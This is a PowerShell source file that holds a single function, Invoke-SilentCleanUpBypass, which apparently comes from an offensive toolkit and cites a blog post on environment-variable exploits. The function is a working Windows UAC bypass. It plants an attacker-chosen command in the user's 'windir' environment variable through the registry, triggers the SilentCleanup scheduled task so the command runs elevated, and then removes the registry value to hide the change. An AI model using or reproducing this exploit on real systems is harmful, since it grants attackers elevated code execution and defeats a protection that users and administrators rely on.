function Invoke-SilentCleanUpBypass {
	#https://tyranidslair.blogspot.co.uk/2017/05/exploiting-environment-variables-in.html
	
	[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command
	)


	$REG = "HKCU:\Environment"
	$NAME = "windir"
	$COMMAND = $Command + ";"
	
	New-ItemProperty -Path $REG -Name $NAME -Value $COMMAND -PropertyType string -Force
	Start-Sleep -s 1
	schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
	Start-Sleep -s 1
	Remove-ItemProperty -Path $REG -Name $NAME
}
